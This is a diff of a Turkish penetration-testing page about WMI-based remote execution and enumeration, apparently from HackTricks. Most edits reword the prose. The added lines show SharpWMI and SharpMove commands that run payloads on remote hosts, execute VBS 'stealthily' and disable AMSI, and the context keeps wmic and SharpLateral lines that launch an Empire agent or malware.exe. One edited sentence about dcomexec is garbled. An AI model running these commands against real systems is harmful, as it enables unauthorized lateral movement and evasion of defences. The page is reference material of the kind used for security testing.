@@ -4,9 +4,9 @@
 
 ## Nasıl Çalıştığı Açıklandı
 
-Kullanıcı adı ve ya şifre ya da hash bilinen hostlarda süreçler WMI kullanılarak açılabilir. Komutlar Wmiexec tarafından WMI kullanılarak yürütülür ve yarı etkileşimli bir shell deneyimi sunar.
+Kullanıcı adı ve ya şifre ya da hash bilinen hostlarda süreçler WMI kullanılarak açılabilir. Komutlar Wmiexec tarafından WMI kullanılarak yürütülür ve yarı etkileşimli bir shell deneyimi sağlar.
 
-**dcomexec.py:** Farklı DCOM uç noktalarını kullanarak, bu script wmiexec.py'ye benzer yarı etkileşimli bir shell sunar ve özellikle ShellBrowserWindow DCOM nesnesini kullanır. Şu anda MMC20, Uygulama, Shell Windows ve Shell Browser Window nesnelerini desteklemektedir. (kaynak: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Farklı DCOM uç noktalarını kullanarak, bu script wmiexec.py'ye benzer yarı etkileşimli bir shell sunar ve özellikle ShellBrowserWindow DCOM nesnesini kullanır. Şu anda MMC20'yi desteklemektedir. Uygulama, Shell Windows ve Shell Browser Window nesneleri. (kaynak: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## WMI Temelleri
 
@@ -57,7 +57,7 @@ $c.methods
 # Method listing and invocation
 Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
 ```
-## WMI Sayımı
+## WMI Sıralaması
 
 ### WMI Servis Durumu
 
@@ -85,21 +85,17 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-WMI üzerinden belirli bilgilerin, örneğin yerel yöneticiler veya oturum açmış kullanıcılar gibi, uzaktan sorgulanması dikkatli komut yapısıyla mümkündür.
+Uzak bir makinedeki yerel yöneticiler veya oturum açmış kullanıcılar gibi belirli bilgileri WMI üzerinden uzaktan sorgulamak, dikkatli komut yapısı ile mümkündür.
 
 ### **Manuel Uzaktan WMI Sorgulama**
 
-Uzaktaki bir makinedeki yerel yöneticilerin ve oturum açmış kullanıcıların gizli bir şekilde tanımlanması, belirli WMI sorguları aracılığıyla gerçekleştirilebilir. `wmic`, aynı zamanda bir metin dosyasından okuma yaparak birden fazla düğümde komutları aynı anda çalıştırmayı destekler.
+Uzak bir makinedeki yerel yöneticilerin ve oturum açmış kullanıcıların gizli bir şekilde tanımlanması, belirli WMI sorguları aracılığıyla gerçekleştirilebilir. `wmic`, aynı zamanda bir metin dosyasından okuma yaparak birden fazla düğümde komutları aynı anda çalıştırmayı destekler.
 
-WMI üzerinden bir işlemi uzaktan yürütmek için, örneğin bir Empire ajanı dağıtmak için, aşağıdaki komut yapısı kullanılır; başarılı bir yürütme, "0" döndürme değeri ile gösterilir:
+WMI üzerinden bir işlemi uzaktan yürütmek için, örneğin bir Empire ajanı dağıtmak gibi, aşağıdaki komut yapısı kullanılır; başarılı bir yürütme, "0" döndürme değeri ile gösterilir:
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
 Bu süreç, WMI'nin uzaktan yürütme ve sistem sayımı yeteneğini göstermekte, hem sistem yönetimi hem de penetrasyon testi için faydasını vurgulamaktadır.
-
-## Referanslar
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 ## Otomatik Araçlar
 
@@ -107,4 +103,24 @@ Bu süreç, WMI'nin uzaktan yürütme ve sistem sayımı yeteneğini göstermekt
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- **Impacket'in `wmiexec`**'ini de kullanabilirsiniz.
+
+
+## Referanslar
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
